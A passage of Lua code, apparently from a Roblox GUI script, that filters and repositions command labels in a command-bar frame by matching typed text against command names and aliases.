		foundLabels = {}
		notFoundLabels = {}
	
		if text == prefixA then
			for command, data in pairs(commandLabels) do
				KATFrame[data.label].Visible = true
				KATFrame[data.label].Position = UDim2.new(0, 0, data.yPos, 0)
			end
		else
			if searchText ~= "" then
				local command, argument = searchText:match(">(%w+)%s*(.-)$")
				if command then
					for cmd, data in pairs(commandLabels) do
						local match = false
						local cmdData = commands[cmd]
						if cmdData then
							if cmd:lower() == command then
								match = true
							else
								for _, alias in ipairs(cmdData.aliases or {}) do
									if alias:lower() == command then
										match = true
										break
									end
								end
							end
						end
						if match then
							table.insert(foundLabels, cmd)
						else
							table.insert(notFoundLabels, cmd)
						end
					end
				else 
					local commandWithoutArg = searchText:match("(%S+)")
					if commandWithoutArg then
						for cmd, data in pairs(commandLabels) do
							local match = false
							local cmdData = commands[cmd]
							if cmdData then
								if cmd:lower():sub(1, #commandWithoutArg) == commandWithoutArg then
									match = true
								else
									for _, alias in ipairs(cmdData.aliases or {}) do
										if alias:lower():sub(1, #commandWithoutArg) == commandWithoutArg then
											match = true
											break
										end
									end
								end
							end
							if match then
								table.insert(foundLabels, cmd)
							else
								table.insert(notFoundLabels, cmd)
							end
						end
					end
				end
			end
		end
	
		local yPos = 0.095
		if #foundLabels == 0 then
			for command, data in pairs(commandLabels) do
				KATFrame[data.label].Visible = true
				KATFrame[data.label].Position = UDim2.new(0, 0, data.yPos, 0)
			end
		else
			for i, command in ipairs(foundLabels) do
				local labelData = commandLabels[command]
				KATFrame[labelData.label].Visible = true
				KATFrame[labelData.label].Position = UDim2.new(0, 0, yPos, 0)
				yPos = yPos + 0.055
			end
	
			for _, command in ipairs(notFoundLabels) do
				local labelData = commandLabels[command]
				KATFrame[labelData.label].Visible = false
			end
		end
	end)
	
end
coroutine.wrap(ZIMB_fake_script)()

